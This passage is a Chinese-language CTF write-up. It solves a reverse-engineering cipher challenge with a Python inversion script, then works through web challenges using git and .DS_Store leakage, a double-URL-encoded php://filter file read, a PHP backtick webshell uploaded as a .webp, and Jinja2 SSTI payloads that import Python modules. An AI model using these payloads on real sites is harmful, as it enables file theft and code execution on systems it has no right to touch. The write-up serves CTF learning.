在内存中按`ctrl+g`跳转到`7FF799A75120`，正好有12个字节且后面全是`00`

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032038232.png)

接着看一下`sub_7FF799A71450`函数的实现

![image-20251019212302339](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032038868.png)

这个函数接收一个 32 位整数 `a1`，经过一连串的 `加减常数` 与 `异或` 操作，返回混淆后的结果

是一个可逆的置换函数



总结一下程序的加密流程

输入 `Str`（长度 a2），按**4 字节小端**打包为 `Count = ceil(a2 / 4)` 个 32-bit 单元 `Block[i]`，最后一组不足 4 字节按真实字节拼成

将 `Block` 按 **3 个 32-bit 为一组**（组数 `v14 = ceil(Count/3)`）处理：

对每组建立局部数组 `v8[0..74]`，先把 `v8[0..2]` 设为该组的三个 32-bit，不足补 0

进行 72 轮扩展：对 `n=0..71` 做

```
tmp = v8[n] ^ S( v8[n+2] ^ v8[n+1] ^ K[n] )
v8[n+3] = S(tmp)
```

其中 `S(x) = sub_7FF799A71450(x)` 是一个固定的、可逆的 32-bit 置换（只含加/减/异或常数）。

把 `v8[72..74]` 作为该组的输出 `out_g[0..2]`。

把所有组的输出按序写入 `v12`，并做链式异或 ：

第 0 组：`v12[i] = out_g[i] ^ IV[i]`（i = 0..2）

第 j>0 组：`v12[3j+k] = out_g[k] ^ v12[3(j-1)+k]`（列向异或）

最后把 `v12` 写成字节（小端）到 `a3`，程序把前 48 字节与 `qword_7FF799A75140` 比较。



要还原明文

先要去 CBC，已知最终写出的 48 字节（按 4 字节小端为 D[0..11]，共 12 个 32-bit，通过已知 IV 可以解出每组的 `B[i] = v8[72..74]`每 3 个就是一个组的 3 个 32-bit 

然后是逐组倒推 72 轮扩展，每组已知 `v8[72..74]`，把 72 轮递推倒序运行恢复 `v8[0..2]`（也就是组内原始的 3 个 32-bit）。核心逆推公式（n 从 71 到 0）：

```
t = Sinv( v8[n+3] )
v8[n] = t ^ S( v8[n+2] ^ v8[n+1] ^ K[n] )
```

其中 `S` 可逆，你可以从 `sub_7FF799A71450` 导出 `Sinv`，就是把操作反向并用相反的加/减/异或顺序。

把所有组的 `v8[0..2]` 顺序拼回，转回小端字节流并截取 48 字节，得到明文

![image-20251019215208800](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032038266.png)

##### exp

```python
def u32(x): return x & 0xFFFFFFFF

EXPECTED = bytes.fromhex("C7C94C956FBFC9F4C486A42057556BE2EADCB73F9C421EE172820D93B3F9D0359370FF44726155F8ECDAFB6EA8A6CB9E")
K_bytes = bytes.fromhex(("67FC44D3B7BD1022009CBB76DEB5F1537F971A827316B0F52766402A3C495F93C14783B94A27ADE1CE398BF60971B7BCAF07"
"82AE5A2FF554B7AC8724BD52AA2B9F5BA4D7C7823DB941F0FB770C534717EE3DA67E4303AD8BD32B82389D9E6B80CF252524"
"BE965D1F5445DB1AD028B64758A3C97713D9433CD36511716EEAFD1A266FEF577EB3CD75DE8086F062D5AA7E4392BA7A2033"
"AF45B216F8F7D1C8D53DF651826DD0E5067631EDDC380B26A17F02F2EFBA1D5ED8D90037585E5FCCDF35BB9A681B67BB2B1B"
"756350CF68423D3A1B14A5466C13E37F72F6863EEE8E0B8AD77CD833A90EA5D4DDFC7AC74DD7C0CDBC F0B6E0C7E9C06611B8"
"94D4818A1D9DB6007C14E4C360DFF812A15F9A22867137DCDC7F6BFE3514A51271F96C3079EA").replace(" ",""))
K = [int.from_bytes(K_bytes[i*4:(i+1)*4],"little") for i in range(72)]
IV = [int.from_bytes(bytes.fromhex(x),"little") for x in ("B2E887BE","92F3E988","C340FB16")]

def S(a1):
    a1 = u32(a1 + 1071031968)
    a1 = u32(a1 ^ 0xFD714A3E)
    a1 = u32(a1 - 927205391)
    a1 = u32(a1 - 451012892)
    a1 = u32(a1 - 1460128592)
    a1 = u32(a1 + 45479597)
    a1 = u32(a1 + 1979752636)
    a1 = u32(a1 - 1645591540)
    a1 = u32(a1 + 759745135)
    a1 = u32(a1 - 1020965622)
    a1 = u32(a1 + 1171837779)
    a1 = u32(a1 - 487836449)
    a1 = u32(a1 + 717238452)
    a1 = u32(a1 - 1030555907)
    a1 = u32(a1 ^ 0x1756F5FD)
    a1 = u32(a1 - 1886114759)
    a1 = u32(a1 - 1008740535)
    a1 = u32(a1 + 977397887)
    return a1

def Sinv(y):
    y = u32(y - 977397887)
    y = u32(y + 1008740535)
    y = u32(y + 1886114759)
    y = u32(y ^ 0x1756F5FD)
    y = u32(y + 1030555907)
    y = u32(y - 717238452)
    y = u32(y + 487836449)
    y = u32(y - 1171837779)
    y = u32(y + 1020965622)
    y = u32(y - 759745135)
    y = u32(y + 1645591540)
    y = u32(y - 1979752636)
    y = u32(y - 45479597)
    y = u32(y + 1460128592)
    y = u32(y + 451012892)
    y = u32(y + 927205391)
    y = u32(y ^ 0xFD714A3E)
    y = u32(y - 1071031968)
    return y

def bytes_to_u32_le(bs):
    out=[]
    for i in range(0,len(bs),4):
        out.append(int.from_bytes(bs[i:i+4],"little"))
    return out

def u32_to_bytes_le(ws):
    return b"".join(u32(w).to_bytes(4,"little") for w in ws)

def remove_cbc(D):
    Count=len(D); groups=(Count+2)//3; B=[0]*Count
    for j in range(groups):
        for k in range(3):
            i=3*j+k
            if i>=Count: break
            B[i]=u32(D[i]^IV[k]) if j==0 else u32(D[i]^D[i-3])
    return B

def invert_group(b0,b1,b2):
    s=[0]*75
    s[72],s[73],s[74]=b0,b1,b2
    for n in range(71,-1,-1):
        t=Sinv(s[n+3])
        s[n]=u32(t ^ S(u32(s[n+2]^s[n+1]^K[n])))
    return s[0:3]

def invert_all(expected):
    D=bytes_to_u32_le(expected)
    B=remove_cbc(D)
    acc=[]
    groups=(len(D)+2)//3
    for j in range(groups):
        g=[0,0,0]
        for k in range(3):
            i=3*j+k
            if i<len(D): g[k]=B[i]
        acc+=invert_group(g[0],g[1],g[2])
    return acc

words = invert_all(EXPECTED)
flag = u32_to_bytes_le(words)[:48]
print(flag.decode('utf-8'))
```



##### flag

```
flag{CoN7r0l_F10w_F14t73n1nG_C4N_b3_c0NfU5iNg!!}
```



## PWN

未解出



## WEB

### 小E的秘密计划

##### 解题过程

打开环境，题目提示备份信息，尝试常用的信息泄露没有找到

扫一下目录看一下

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728479.png)

发现一个`www.zip`文件，访问下载下来

![image-20251019223010506](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728410.png)

发现 ``public-555edc76-9621-4997-86b9-01483a50293e/.git/``：这是一个 Git 版本库目录，通常包含完整的项目提交历史、可能的历史文件

`login.php`：潜在的登录入口文件，可能含有 flag 或密码逻辑。

`index.html`：网站主页。

这个文件夹下有`.git`文件，可能存在`git`泄露

![image-20251019223542952](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728578.png)

`login`也提示了说在`git`里找找

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728067.png)

有 3 个主要提交（hash 与提交信息）：  

`1389b4798a80...` — 初始化  

`5f8ecc03aee0...` — 新增提示  

`5fef682d7ece...` — 删除提示 

有一次分支操作/临时提交（日志里有一条 测试，这个branch会删），该提交的对象仍在 `.git` 中但不在 HEAD（也就是某些文件存在于被删除的分支 / 历史中）

按历史对象查到了一个被删除但仍在对象库的 `user.php`。

用命令 `git rev-list --all`  `git log --pretty=fuller -p` - `git ls-tree -r <tree>` - `git cat-file -p <blob>`

定位到包含 `user.php` 的提交（来自 reflog 中的历史 commit）： 

历史中的一个临时 commit：`353b98f7c2fe77a5a426bf73576f5113820c4669`（提交信息含“测试，这个branch会删”） 

该 commit 的 tree 列表显示：  ```  index.html  login.php  user.php  ``` 

恢复到手的 `user.php` 内容（已从 git blob 抽取） `user.php` 的内容如下（原样）：

```php
php <?php function getUserData() {    
    return [        
        'username' => 'admin',        
        'password' => 'f75cc3eb-21e0-4713-9c30-998a8edb13de'    
    ]; } 
```

向这个`login.php`页面发一个`POST`请求，得到`sercet`页面

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728379.png)

访问这个页面

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728464.png)

没有`flag`，想到题目中说的`MAC`电脑自动生成的文件，之前有了解过`DS_Stroe`泄露

这里扫站看一下，发现果然是`DS_Store`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728048.png)

将这个文件下载下来

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150728346.png)

用工具查看一下这个文件

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729080.png)

得到下一个路径，访问得到`flag`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729678.png)

##### flag

```
flag{af141c39-be4a-477d-a36a-9a7709dcb7a3}
```



### ez-chain

##### 解题过程

![image-20251019224938802](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729805.png)

后端对路径做了字符串过滤（filter 函数），但只过滤了一层**；   **如果经过两次 URL 编码，再配合 php:// 伪协议，就能绕过并读取文件内容

题目还会对返回结果进行`base64`解码，对我们传入的参数做一次`URL`解码，然后检查

![image-20251019225024958](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729214.png)

 所以用filter协议，不能用base64编码返回结果，url解码检查这里可以再编码一次解决

构造`payload`

```
?file=php://filter/read=string.rot13/resource=/flag
```

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729490.png)

进行两次`URL`编码

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729907.png)

得到`rot13`编码的`flag`，解码得到`flag`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729747.png)



##### flag

```
flag{7cb3f42a-99c9-49ba-960b-ae984ab30187}
```



### mygo!!!

##### 解题过程

打开解题环境，点击flag没有反应

打开开发者工具看一下网络

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729149.png)

发现这里访问的调用是利用里proxy协议来读取的本地的文件

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729518.png)

这里尝试读取一下本地的文件，读flag.php得到以下内容

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150729365.png)

这个页面用`GET`方法获取一个`soyorin`的参数，这里利用参数用`file`协议读取`flag`

![4](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150730365.png)



### mirror_gate

##### 解题过程

打开题目页面，查看源码可以发现提示信息

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150730736.png)

客户端有一些前端限制（`MAX_FILE_SIZE = 5MB`、`accept="*/*"`、前端 JS 控制提交按钮等）。   

HTML 最底部注释：`<!-- flag is in flag.php -->` 与 `<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->`    

这条 Base64 解码后是：`something_is_in_/uploads/`。  

页面不允许很多的东西上传

用`yakit`抓包尝试伪造一句话木马为gif上传失败

这里`rce`应该是不行的，结合两条提示信息，这里应该是上传文件来读取`flag.php`文件

这里还会对文件内容做检查

不允许出现命令和关键信息

这里用`tac`以及通配符来绕过

```
<?=`tac /fl*`?>
```

构造文件修改后缀为`webp`上传

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150730630.png)

成功上传访问这个文件成功读取到`flag`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150731422.png)





### who'ssti

##### 解题过程

阅读下给的源码

是一个 Flask + Jinja2 SSTI（服务器端模板注入）的 题，考点是如何在被限制的环境下通过 SSTI 调用 Python 内置函数以触发特定函数调用

看题目需要被调用的五个函数

随机目标函数列表 题目中定义了： 

```
func_List = ["get_close_matches", "dedent", "fmean",        
"listdir", "search", "randint", "load", "sum",              
"findall", "mean", "choice"] 
need_List = random.sample(func_List, 5) 
need_List = dict.fromkeys(need_List, 0) 
```

即每次启动后，

`need_List` 会随机包含 5 个函数名（例如 `["listdir", "choice", "search", "sum", "findall"]`）。 程序会在 trace_calls 时检测： ```python if func_name in need_List:    need_List[func_name] = 1 ``` 当 **所有函数都被调用过一次** 时： ```python if all(need_List.values()):    BoleanFlag = True ``` 即可获得 `flag`

代码中： ```python submit = request.form.get('submit') if submit:    sys.settrace(trace_calls)    print(render_template_string(submit))    sys.settrace(None) ``` 

用户输入的 `submit` 直接进入 `render_template_string(submit)`，即 **未经过滤的模板字符串渲染** 

利用 `Jinja2 SSTI` 调用 `Python` 函数 在 `Jinja2` 中，你可以通过对象链访问到 `Python` 内置函数，

```
{{ ''.__class__.__mro__[1].__subclasses__() }} 
```

 但这里不需要执行命令，只要调用特定函数即可。 

```
{{ lipsum.__globals__.__builtins__.__import__('random').choice([1,2,3]) }}
{{ lipsum.__globals__.__builtins__.__import__('textwrap').dedent('x') }}
{{ lipsum.__globals__.__builtins__.__import__('statistics').mean([1,2,3]) }}
{{ lipsum.__globals__.__builtins__.__import__('json').loads('\"x\"') }}
{{ lipsum.__globals__.__builtins__.__import__('re').search('a','aaa') }}
```

成功利用五个函数的`ssti`后，直接返回`flag`

![](https://gitee.com/ttovlove/images/raw/master/KCTF/202603150731633.png)





